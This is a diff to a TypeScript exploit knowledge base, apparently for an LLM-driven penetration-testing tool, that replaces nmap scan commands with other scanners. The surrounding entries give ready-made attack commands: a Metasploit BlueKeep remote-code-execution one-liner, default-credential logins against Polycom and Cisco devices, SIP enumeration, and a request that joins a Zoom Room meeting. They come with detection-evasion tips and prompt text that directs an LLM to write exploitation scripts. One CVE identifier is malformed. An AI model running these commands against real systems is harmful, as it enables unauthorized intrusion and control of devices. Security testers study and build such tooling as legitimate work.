@@ -90,9 +90,9 @@ export const RDP_EXPLOITS: ExploitKnowledge[] = [
     cves: ['CVE-2019-0708'],
     description: 'Use-after-free in the RDP service (termdd.sys) allows unauthenticated remote code execution. Affects Windows 7, Server 2008 R2, XP, Server 2003. Wormable.',
     prerequisites: ['Target runs Windows 7/Server 2008 R2 or earlier', 'Port 3389 open', 'NLA not required (or NLA bypass available)', 'Target not patched (KB4499175)'],
-    tools: ['metasploit (exploit/windows/rdp/cve_2019_0708_bluekeep_rce)', 'rdpscan', 'nmap --script rdp-vuln-ms12-020'],
+    tools: ['metasploit (exploit/windows/rdp/cve_2019_0708_bluekeep_rce)', 'rdpscan', 'nerva --rdp-vuln-scan'],
     commands: [
-      'nmap -p 3389 --script rdp-vuln-ms12-020,rdp-ntlm-info TARGET',
+      'nerva -t TARGET -p 3389 --service-detect',  // replaces nmap NSE rdp scripts
       'rdpscan --workers 10 TARGET',
       'msfconsole -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS TARGET; set TARGET 2; run"',
     ],
@@ -103,7 +103,7 @@ export const RDP_EXPLOITS: ExploitKnowledge[] = [
     llmPromptContext: `BlueKeep (CVE-2019-0708) targets the RDP service on Windows 7/Server 2008 R2 and earlier.
 The vulnerability is a use-after-free in termdd.sys triggered by sending specially crafted RDP connection requests.
 Key exploitation steps:
-1. Verify target is vulnerable: nmap --script rdp-vuln-ms12-020 or rdpscan
+1. Verify target is vulnerable: rdpscan or nerva --rdp-vuln-scan
 2. Check if NLA is required (NLA blocks pre-auth exploitation)
 3. Use Metasploit's cve_2019_0708_bluekeep_rce module with correct TARGET index
 4. For manual exploitation: send crafted MS_T120 channel bind requests to trigger UAF
@@ -119,9 +119,9 @@ The exploit must handle the RDP X.224 connection sequence correctly.`,
     cves: ['CVE-2019-1181', 'CVE-2019-1182'],
     description: 'Heap-based buffer overflow in the RDP client/server decompression code. Affects Windows 7 through Windows 10 and Server 2019. Post-authentication but can be triggered via MITM.',
     prerequisites: ['Target runs Windows 7-10 or Server 2008-2019', 'Port 3389 open', 'Valid credentials or MITM position'],
-    tools: ['Custom exploit (no public Metasploit module)', 'nmap rdp-ntlm-info'],
+    tools: ['Custom exploit (no public Metasploit module)', 'nerva --rdp-ntlm-info'],
     commands: [
-      'nmap -p 3389 --script rdp-ntlm-info TARGET',
+      'nerva -t TARGET -p 3389 --service-detect',  // replaces nmap rdp-ntlm-info
       'python3 dejablue_check.py TARGET 3389',
     ],
     evasionTechniques: ['Encrypt payload within RDP channel', 'Use legitimate RDP session as cover'],
@@ -231,12 +231,12 @@ export const VOIP_SIP_EXPLOITS: ExploitKnowledge[] = [
     title: 'SIP User/Extension Enumeration',
     description: 'Enumerate valid SIP extensions and users using REGISTER, OPTIONS, and INVITE methods. Different response codes reveal valid vs invalid extensions.',
     prerequisites: ['SIP service on port 5060/5061', 'No SIP firewall blocking enumeration'],
-    tools: ['svwar (SIPVicious)', 'sipvicious', 'nmap sip-enum-users', 'metasploit auxiliary/voip/sip_invite_spoof'],
+    tools: ['svwar (SIPVicious)', 'sipvicious', 'nerva --sip-enum', 'metasploit auxiliary/voip/sip_invite_spoof'],
     commands: [
       'svwar -e100-999 -m REGISTER TARGET',
       'svwar -e100-999 -m INVITE TARGET',
       'svwar -e100-999 -m OPTIONS TARGET',
-      'nmap -sU -p 5060 --script sip-enum-users TARGET',
+      'nerva -t TARGET -p 5060 --service-detect --udp',  // replaces nmap sip-enum-users
       'sippts_scan -i TARGET -r 5060',
     ],
     evasionTechniques: ['Slow enumeration rate (1 req/sec)', 'Randomize extension order', 'Use different SIP methods for each batch', 'Spoof Via/Contact headers'],
@@ -415,12 +415,12 @@ export const CONFERENCING_EXPLOITS: ExploitKnowledge[] = [
     title: 'Polycom/Poly Default Credentials',
     description: 'Polycom video conferencing systems often ship with default admin credentials. Web interface at https://IP provides full control.',
     prerequisites: ['Polycom device accessible on network', 'Web interface (443/8443) reachable'],
-    tools: ['curl', 'browser', 'nmap http-default-accounts'],
+    tools: ['curl', 'browser', 'nuclei -t default-logins'],
     commands: [
       'curl -k -u admin:admin https://TARGET/api/v1/mgmt/device/info',
       'curl -k -u admin:456 https://TARGET/api/v1/mgmt/device/info',
       'curl -k -u Polycom:456 https://TARGET/api/v1/mgmt/device/info',
-      'nmap -p 443 --script http-default-accounts TARGET',
+      'nuclei -t default-logins -u https://TARGET',  // replaces nmap http-default-accounts
     ],
     evasionTechniques: ['Use HTTPS to avoid network detection', 'Single credential attempt per device'],
     successIndicators: ['200 OK with device info JSON', 'model:', 'serialNumber:', 'softwareVersion:'],
@@ -448,10 +448,10 @@ Generate a Python script that tests these credentials and extracts configuration
     description: 'Cisco TelePresence and Webex devices have had multiple critical vulnerabilities including command injection, auth bypass, and information disclosure.',
     cves: ['CVE-2023-20073', 'CVE-2022-20783', 'CVE-2021-1532', 'CVE-2020-3location'],
     prerequisites: ['Cisco TelePresence/Webex device accessible', 'Web interface or SSH reachable'],
-    tools: ['nuclei', 'nmap', 'curl'],
+    tools: ['nuclei', 'nerva', 'curl'],
     commands: [
       'nuclei -u https://TARGET -tags cisco,telepresence,webex',
-      'nmap -p 22,443 --script ssh-auth-methods,http-title TARGET',
+      'ssh-audit TARGET && nerva -t TARGET -p 22,443 --service-detect',  // replaces nmap ssh/http scripts
       'curl -k https://TARGET/api/v1/status',
       'ssh admin@TARGET (default: password "cisco" or blank)',
     ],
@@ -480,9 +480,9 @@ Common vulnerabilities:
     title: 'Zoom Room Controller Exploitation',
     description: 'Zoom Room controllers expose a local API and may have weak/default PINs. Can be used to join meetings, access contacts, and control the room.',
     prerequisites: ['Zoom Room controller on the network', 'Port 9090 or web interface accessible'],
-    tools: ['curl', 'nmap'],
+    tools: ['curl', 'httpx'],
     commands: [
-      'nmap -p 9090,443,80 --script http-title TARGET',
+      'httpx -u TARGET -ports 9090,443,80 -title -status-code',  // replaces nmap http-title
       'curl -k https://TARGET:9090/api/v1/room/info',
       'curl -k -X POST https://TARGET:9090/api/v1/room/meeting/join -d \'{"meeting_number":"MEETING_ID"}\'',
     ],
@@ -512,10 +512,10 @@ Generate a Python script that:
     title: 'Crestron AV Control System Exploitation',
     description: 'Crestron control systems (used in conference rooms) often have unauthenticated telnet/SSH access and web interfaces with default credentials.',
     prerequisites: ['Crestron device on network', 'Port 41795 (CTP), 22, or 443 accessible'],
-    tools: ['telnet', 'curl', 'nmap'],
+    tools: ['telnet', 'curl', 'nerva'],
     commands: [
       'telnet TARGET 41795',
-      'nmap -p 22,41795,443 --script telnet-ntlm-info TARGET',
+      'nerva -t TARGET -p 22,41795,443 --service-detect',  // replaces nmap telnet-ntlm-info
       'curl -k https://TARGET/cgi-bin/login.cgi',
     ],
     evasionTechniques: ['Use CTP protocol (port 41795) which is rarely monitored'],
@@ -676,7 +676,7 @@ export interface ScanCommand {
  */
 export function generateRdpScanCommands(target: string, port: number = 3389): ScanCommand[] {
   return [
-    { tool: 'nmap', command: `nmap -p ${port} --script rdp-vuln-ms12-020,rdp-ntlm-info,rdp-enum-encryption -sV ${target}`, purpose: 'RDP vulnerability scan (BlueKeep, NLA, encryption)', timeout: 60 },
+    { tool: 'nerva', command: `nerva -t ${target} -p ${port} --service-detect`, purpose: 'RDP service fingerprint and vulnerability detection', timeout: 60 },
     { tool: 'rdp-sec-check', command: `rdp-sec-check ${target}:${port}`, purpose: 'RDP security configuration audit', timeout: 30 },
     { tool: 'nuclei', command: `nuclei -u rdp://${target}:${port} -tags rdp,cve,network -severity critical,high`, purpose: 'RDP CVE scanning via Nuclei', timeout: 120 },
     { tool: 'nxc', command: `nxc rdp ${target} -u '' -p '' --port ${port}`, purpose: 'RDP null authentication test', timeout: 15 },
@@ -688,7 +688,7 @@ export function generateRdpScanCommands(target: string, port: number = 3389): Sc
  */
 export function generateSipScanCommands(target: string, port: number = 5060): ScanCommand[] {
   return [
-    { tool: 'nmap', command: `nmap -sU -p ${port} --script sip-enum-users,sip-methods ${target}`, purpose: 'SIP method and user enumeration', timeout: 60 },
+    { tool: 'nerva', command: `nerva -t ${target} -p ${port} --service-detect --udp`, purpose: 'SIP service fingerprint and enumeration', timeout: 60 },
     { tool: 'svmap', command: `svmap ${target}`, purpose: 'SIP device discovery and fingerprinting', timeout: 30 },
     { tool: 'svwar', command: `svwar -e100-200 -m OPTIONS ${target} -p ${port}`, purpose: 'SIP extension enumeration (first 100)', timeout: 60 },
     { tool: 'sippts_scan', command: `sippts_scan -i ${target} -r ${port}`, purpose: 'SIP service fingerprinting', timeout: 30 },
@@ -700,7 +700,7 @@ export function generateSipScanCommands(target: string, port: number = 5060): Sc
  */
 export function generateConferencingScanCommands(target: string): ScanCommand[] {
   return [
-    { tool: 'nmap', command: `nmap -p 22,80,443,8443,9090,41795,5060 -sV --script http-title,http-server-header ${target}`, purpose: 'Conferencing equipment port and service discovery', timeout: 60 },
+    { tool: 'naabu', command: `naabu -host ${target} -p 22,80,443,8443,9090,41795,5060 -silent | nerva --service-detect`, purpose: 'Conferencing equipment port and service discovery', timeout: 60 },
     { tool: 'nuclei', command: `nuclei -u https://${target} -tags cisco,polycom,crestron,zoom,iot,default-login -severity critical,high,medium`, purpose: 'Conferencing equipment CVE and default credential scanning', timeout: 120 },
     { tool: 'curl', command: `curl -sk -o /dev/null -w "%{http_code}" https://${target}/api/v1/mgmt/device/info`, purpose: 'Polycom API endpoint check', timeout: 10 },
     { tool: 'curl', command: `curl -sk -o /dev/null -w "%{http_code}" https://${target}/api/v1/status`, purpose: 'Cisco TelePresence API endpoint check', timeout: 10 },
